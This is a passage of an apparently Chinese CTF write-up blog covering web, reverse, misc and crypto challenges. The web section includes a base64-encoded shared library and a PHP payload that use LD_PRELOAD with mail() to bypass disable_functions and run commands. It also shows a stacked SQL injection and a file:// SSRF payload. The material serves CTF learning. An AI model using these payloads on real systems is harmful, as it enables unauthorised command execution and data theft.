AAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAAAAAAA9AAAAAEAEwAoCSAAAAAAAAAAAAAAAAAA/QAAAAEAFgBgCyAAAAAAAAAAAAAAAAAACQEAAAEAFQAYCyAAAAAAAAAAAAAAAAAAHwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwEAACAAAAAAAAAAAAAAAAAAAAAAAAAATwEAABAAFgBgCyAAAAAAAAAAAAAAAAAAVgEAABIADABgCAAAAAAAAAAAAAAAAAAAXAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAfwEAABEAAAAAAAAAAAAAAAAAAAAAAAAAlAEAABAAFwBoCyAAAAAAAAAAAAAAAAAAmQEAABAAFwBgCyAAAAAAAAAAAAAAAAAApQEAABIACwDABwAAAAAAAJ0AAAAAAAAArQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAwQEAABEAAAAAAAAAAAAAAAAAAAAAAAAA2AEAACAAAAAAAAAAAAAAAAAAAAAAAAAA8gEAACIAAAAAAAAAAAAAAAAAAAAAAAAADgIAABIACQA4BgAAAAAAAAAAAAAAAAAAFAIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAHJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY2NzAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfZWRhdGEAX2ZpbmkAc3lzdGVtQEBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBlbnZpcm9uQEBHTElCQ18yLjIuNQBfZW5kAF9fYnNzX3N0YXJ0AHByZWxvYWQAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2Vudmlyb25AQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AHN0cnN0ckBAR0xJQkNfMi4yLjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAAuAEAAAAAAAC4AQAAAAAAADwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAPgBAAAAAAAA+AEAAAAAAADIAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADAAwAAAAAAAMADAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAigQAAAAAAACKBAAAAAAAACYAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAALAEAAAAAAAAsAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA&#x27;</span>;var_dump(file_put_contents(<span class="string">&#x27;/var/tmp/helloworld.so&#x27;</span>,base64_decode(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><h3 id="2-利用so文件绕过被ban的函数"><a href="#2-利用so文件绕过被ban的函数" class="headerlink" title="2. 利用so文件绕过被ban的函数"></a>2. 利用so文件绕过被ban的函数</h3><p>把so文件传上去后其实可以继续传项目里的那个php的, 不过还是想试试能不能直接在payload里面实现.</p><p>其实也不难, 先设置需要执行的命令<code>/readflag &gt; /var/tmp/K1rit0</code>, 再设置环境变量LD_PRELOAD的值为刚刚传上去的helloworld.so, 然后调用mail(). 这个时候就会再/tmp下生成一个K1rit0, 里面就是/readflag的结果了!</p><p>所以payload为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(putenv(<span class="string">&quot;EVIL_CMDLINE=/readflag &gt; /var/tmp/K1rit0&quot;</span>));var_dump(putenv(<span class="string">&quot;LD_PRELOAD=/var/tmp/helloworld.so&quot;</span>));var_dump(mail(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>));var_dump(file_get_contents(<span class="string">&#x27;/var/tmp/K1rit0&#x27;</span>));</span><br></pre></td></tr></table></figure><p><a name='7'></a></p><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-18a14a4782f849fe8a713ba563b6d543.png" alt="图片.png"><br>真的很baby, query语句直接给出来了.参考自己的另外一个坑就能做了<a href="http://47.98.130.190:8090/archives/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%BB%8F%E9%AA%8C%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0">某篇sql总结</a></p><p>当时想都没想直接堆叠注入了(以至于以为这题过滤都没有,其实select这些还是被过滤掉了的<br><code>1&#39;;show databases;show tables #</code> 直接爆出库名和表名了<br><code>1&#39;;desc flag # </code> 爆出字段名<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-f11c852b4304418e9c58a9f0376e48e5.png" alt="图片.png"><br>然后就发现特殊字符串enjoy_Sq1i11_qu3ryy 包裹ctf{}提交了<br><a name='8'></a></p><h2 id="babyssrf"><a href="#babyssrf" class="headerlink" title="babyssrf"></a>babyssrf</h2><p>白给白给</p><p>利用file://协议, 提示说的很清楚了就在/flag</p><p>payload: <code>?url=file:///flag</code><br><a name='9'></a></p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>搜啊搜搜啊搜, 真的是搜出来的flag哦(按着提示搜就行了<br><a name='10'></a></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><blockquote><p>因为本身就是为了拿分才做的RE, 所以wp就比较简短了(真不想写hhh</p><blockquote><p>可以去看看Misaka大佬的wp</p></blockquote></blockquote><h2 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h2><p>Ida打开文件, 随便翻了翻, 发现<br> <img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-4dae16af3f344b97a2c1ba697cafc21a.png" alt="图片.png"><br>根据语义手动拼回flag<br><a name='11'></a></p><h2 id="basic-hash"><a href="#basic-hash" class="headerlink" title="basic_hash"></a>basic_hash</h2><p>我就只会F5! 还好主函数很简单, 就是要求做题人利用异或运算的特点A+B+B = A还原两个md5值,然后扔到某<a href="https://www.cmd5.com/">MD5<del>爆破</del>网站</a>获得flag.<br>把ida中的两个字符串的值手动输入到脚本中,跑脚本就完事了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v9 = [<span class="number">70</span>, -<span class="number">121</span>, -<span class="number">115</span>, <span class="number">4</span>, -<span class="number">67</span>, <span class="number">52</span>, <span class="number">126</span>, <span class="number">42</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">79</span>, <span class="number">91</span>, -<span class="number">61</span>, -<span class="number">63</span>, <span class="number">6</span>, -<span class="number">14</span>]</span><br><span class="line">v26 = [<span class="number">59</span>, -<span class="number">87</span>, <span class="number">103</span>, -<span class="number">122</span>, -<span class="number">46</span>, -<span class="number">112</span>, <span class="number">104</span>, -<span class="number">30</span>, -<span class="number">92</span>, <span class="number">113</span>, <span class="number">125</span>, -<span class="number">85</span>, -<span class="number">14</span>, <span class="number">41</span>, -<span class="number">24</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">mask = <span class="number">0b11111111</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">    <span class="keyword">if</span> v9[i] &lt; <span class="number">0</span>:</span><br><span class="line">        v9[i] = <span class="built_in">abs</span>(v9[i] ^ mask) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v26)):</span><br><span class="line">    <span class="keyword">if</span> v26[i] &lt; <span class="number">0</span>:</span><br><span class="line">        v26[i] = <span class="built_in">abs</span>(v26[i] ^ mask) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">input1_md5 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(i ^ <span class="number">0x30</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> v9])</span><br><span class="line">input2_md5 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(i ^ <span class="number">0x20</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> v26])</span><br><span class="line">print(input1_md5)</span><br><span class="line">print(input2_md5)</span><br></pre></td></tr></table></figure><p>这样就拿到两个MD5了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">76b7bd348d044e1a41427f6bf3f136c2</span><br><span class="line">1b8947a6f2b048c284515d8bd209c83f</span><br></pre></td></tr></table></figure><p>扔进网站, 得到flag<br><a name='12'></a></p><h2 id="ByteCode"><a href="#ByteCode" class="headerlink" title="ByteCode"></a>ByteCode</h2><p>因为爽哥说很简单, 所以我就来看看, 百度了一下ByteCode. 知道是就是一堆操作之后. 找到ByteCode和操作的对应表! 拿出纸笔! 点开计算机! 一点一点手动往回算…(手动算的感觉针不戳<br>算完ascii码全部转成字符串就是flag了<br><a name='13'></a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><blockquote><p>说实话没想到Misc这么多题, 不过Misc做起来就感觉像猜谜一样, 也挺有趣的.</p></blockquote><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>不亏是我最拿手的签到题.秒解flag 2333<br><a name='14'></a></p><h2 id="Look-at-your-keyboard"><a href="#Look-at-your-keyboard" class="headerlink" title="Look_at_your_keyboard"></a>Look_at_your_keyboard</h2><p>题目都说了看键盘咯. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewazx tyugv iuhbvghj uhb iujmn iuhbvghj yhnmki vgyhnji</span><br></pre></td></tr></table></figure><p>键盘上是怎样的就怎样的(所以做的时候觉得S是8, I是1的肯定不是我一个吧!<br>结果是ctfisfun, 对着键盘看就能看出来了.<br><a name='15'></a></p><h2 id="Buddha"><a href="#Buddha" class="headerlink" title="Buddha"></a>Buddha</h2><p>也没啥好说的.<br>新佛曰-&gt;base64-&gt;栅栏密码<br><a name='16'></a></p><h2 id="Do-you-know-Xp0int"><a href="#Do-you-know-Xp0int" class="headerlink" title="Do you know Xp0int"></a>Do you know Xp0int</h2><p>用记事本打开图片.<br>用<del>眼睛一行一行的看有没有flag</del>搜索<code>ctf&#123;</code> 结果啥都没<br>搜<code>&#123;</code> 就找到flag了. 似乎有个可以跑出文件中出现的字符串的脚本<br><a name='17'></a></p><h2 id="close-base"><a href="#close-base" class="headerlink" title="close_base"></a>close_base</h2><p>base64解码发现是C语言源码 (输出不是hello,world, 差评!<br>估计是base64隐写了, 毕竟每一行base64编码结尾都有等号, 肯定能藏很多东西2333<br>所以base64隐写是啥?这里不写了…<br>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2text</span>(<span class="params">Bin</span>):</span></span><br><span class="line">    Hex = <span class="built_in">hex</span>(<span class="built_in">int</span>(Bin, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Hex) % <span class="number">2</span>: Hex = <span class="string">&#x27;0&#x27;</span> + Hex</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> [Hex[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Hex), <span class="number">2</span>)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    base = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(base)):</span><br><span class="line">    base[i] = base[i][::-<span class="number">1</span>][<span class="number">1</span>:<span class="number">5</span>][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> base:</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="keyword">if</span> j != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            o = <span class="built_in">bin</span>(table.index(j))[<span class="number">2</span>:]</span><br><span class="line">            tmp += <span class="string">&#x27;0&#x27;</span> * (<span class="number">6</span> - <span class="built_in">len</span>(o)) + o</span><br><span class="line">    tmp = tmp + <span class="string">&#x27;0&#x27;</span> * (<span class="number">24</span> - <span class="built_in">len</span>(res))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;==&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        res += tmp[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        res += tmp[<span class="number">16</span>:<span class="number">18</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctf&#123;&#x27;</span> + bin2text(res) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出的就是flag了(具体原理真的到处都有的,找就完事了<br><a name='18'></a></p><h2 id="PMGBA"><a href="#PMGBA" class="headerlink" title="PMGBA"></a>PMGBA</h2><p>做的最过瘾的一题(但是被自己蠢到了<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-9bfe0f9125864a95ac95233e8d3b220d.png" alt="图片.png"></p><p>开局一张图, 文件全靠拆.<br>说实话一开始拿到图感觉挺熟悉的, 就是记不起来这是什么…<br>直到去百度PMGBA的意思才知道是宝可梦.这不就是我上学期练级刷的怪吗!</p><p>我也算是半年的宝可梦老玩家了(俊强才是宝可梦大师!<br>马上跑去问俊强”上学期我刷等级刷的那个有26个形态的字母怪叫什么”<br>‘未知图腾’</p><p>马上去找图鉴, 对应图鉴得到字符串remember to examine the.<br>一开始拿到这个我还以为就是想让我检查这张图片的意思(鬼知道这是flag的前半部分啊喂</p><p>扔binwalk跑了一下发现确实不止一张图片.由于被foremost坑过所以能手动分文件就手动分了. 用winhex打开图片, 对照这文件头文件尾, 分出了三张图(包括最开始的未知图腾</p><p>最开始注意到的其实是第三张图, 这是我第一个练到5v的宝可梦, 卡蒂狗!<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6036d9f95b4448bd9daebe6d152ed46c.png" alt="图片.png"><br>拖进Stegsolve分析没有什么结果后. 决定看看是不是LSB. 于是又把卡蒂狗扔进zsteg, 出来了一串字符串’pwd is 58growliness\n’. </p><p>密码是58growliness?</p><p>不知道这个密码是个啥直到从第二张图里分出段base64, 解码后发现是个加密的压缩包. 密码就是58growliness</p><p>里面一个txt, 内容全是pi ka chu的组合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi.... 后面还有很多</span><br></pre></td></tr></table></figure><p>猜测是某种加密, 但是却搜不到.但后面找到一篇大概讲的是用皮卡丘语编程的文章, 大概内容就是套用brainfuck的语法来编程. 所以来试试看是不是brainfuck. </p><p>根据字符出现的频率自己强行脑部回了对应表(dalao说github上有!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dit=&#123; </span><br><span class="line"><span class="string">&#x27;pi&#x27;</span>:<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ka&#x27;</span>:<span class="string">&#x27;-&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;chu&#x27;</span>:<span class="string">&#x27;]&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;pika&#x27;</span>:<span class="string">&#x27;[&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;pipi&#x27;</span>:<span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;pichu&#x27;</span>:<span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;pikachu&#x27;</span>:<span class="string">&#x27;.&#x27;</span>, </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>还原回brainfuck代码后运行得到的结果为foo bar</p><p>事实上拼接前面的remember to examine the foo bar 就是flag了.<br>但我却没有想到…(谁想的到啊<br>所以一直卡着不知道flag是啥.直到周一马克思课想着随便试一下, 才提交成功…(correct出来的时候人都傻了..<br><del>还是脑洞不够大吗</del><br><a name='19'></a></p><h2 id="集齐五龙珠"><a href="#集齐五龙珠" class="headerlink" title="集齐五龙珠"></a>集齐五龙珠</h2><p>一大堆的文件, 名字全都是base64. 想看看全部解码会不会有什么线索.<br>写了个脚本来解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">base = <span class="string">&#x27;problem/&#x27;</span></span><br><span class="line"></span><br><span class="line">filenames = []</span><br><span class="line"><span class="keyword">for</span> root, ds, fs <span class="keyword">in</span> os.walk(base):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> fs:</span><br><span class="line">        print(f, b64decode(f).decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)) <span class="comment"># 输出文件名和解码之后的文件名</span></span><br></pre></td></tr></table></figure><p>果然里面有五个很特殊的文件, 解码之后是正常的字符串.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-0dfa9dba42d942048201e980ae4a9e65.png" alt="图片.png"><br>就是后缀带one的文件(其他的是后面解题的文件</p><p>winhex打开first_one和last!_one 发现似乎是一个压缩包被拆成五份了.<br>尝试还原回去, 但是不知道中间三个压缩包的顺序. 于是写了个脚本来手动尝试(因为就3个文件就8种组合, 自己调换顺序就行了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">filename = &#123;</span><br><span class="line">    <span class="string">&#x27;fi&#x27;</span>: <span class="string">&#x27;first_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fu&#x27;</span>: <span class="string">&#x27;funny_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;la&#x27;</span>: <span class="string">&#x27;last!_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sm&#x27;</span>: <span class="string">&#x27;smart_one&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cu&#x27;</span>: <span class="string">&#x27;cute__one&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename[i], <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        files[i] = f.read()</span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line"><span class="comment"># file =files[&#x27;fi&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;la&#x27;]</span></span><br><span class="line">file = files[<span class="string">&#x27;fi&#x27;</span>] + files[<span class="string">&#x27;cu&#x27;</span>] + files[<span class="string">&#x27;sm&#x27;</span>] + files[<span class="string">&#x27;fu&#x27;</span>] + files[<span class="string">&#x27;la&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试到第五个的时候压缩包就能正常的解压了.<br>解压出来一个flag文件, winhex打开发现文件头是jpg的文件头.<br>后缀改成jpg后打开<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-ca5062bb93694bf4a12349419a7457bd.png" alt="图片.png"><br><a name='20'></a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><blockquote><p>最喜欢的密码学! 这次想着要做完密码的, 可惜最后一道题没有做出来. 有趣的加密太难了, 附件只有一段像base的编码, 没什么思路…..<br><a name='21'></a></p></blockquote><h2 id="碰碰车"><a href="#碰碰车" class="headerlink" 